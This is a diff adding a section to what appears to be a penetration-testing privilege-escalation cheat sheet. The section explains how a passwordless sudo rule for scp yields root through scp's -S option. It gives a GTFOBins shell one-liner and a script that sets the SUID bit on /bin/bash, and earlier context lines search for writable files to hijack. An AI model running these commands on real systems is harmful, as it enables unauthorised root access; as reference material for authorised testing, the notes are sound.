@@ -589,3 +589,26 @@ env                                        # interesting env vars / tokens
 find / -name "*.py" -writable 2>/dev/null  # python library hijack
 find / -name "*.yml" -writable 2>/dev/null # ansible playbook hijack
 ```
+
+## sudo scp -> root (GTFOBins, non-interactive)
+
+`sudo -l` shows `(ALL) NOPASSWD: /usr/bin/scp`. scp's `-S <prog>` option runs `<prog>` as the SSH
+transport program, i.e. as root. Interactive shell (GTFOBins):
+
+```sh
+TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:
+```
+
+Non-interactive / scripted (works over a one-shot SSH command, no TTY): point `-S` at a script that
+escalates, then use the result:
+
+```sh
+printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /tmp/p.sh; chmod +x /tmp/p.sh
+timeout 6 sudo scp -S /tmp/p.sh /etc/hostname x:/tmp/z   # scp then errors, but /tmp/p.sh already ran as root
+bash -p -c id                                            # euid=0(root)
+```
+
+Wrap the `sudo scp` in `timeout` so the fake transport can't hang the session. Revert afterwards:
+`chmod u-s /bin/bash`. See GTFOBins `scp` (sudo).
+
+<!-- promoted-slug: sudo-scp-gtfobins -->
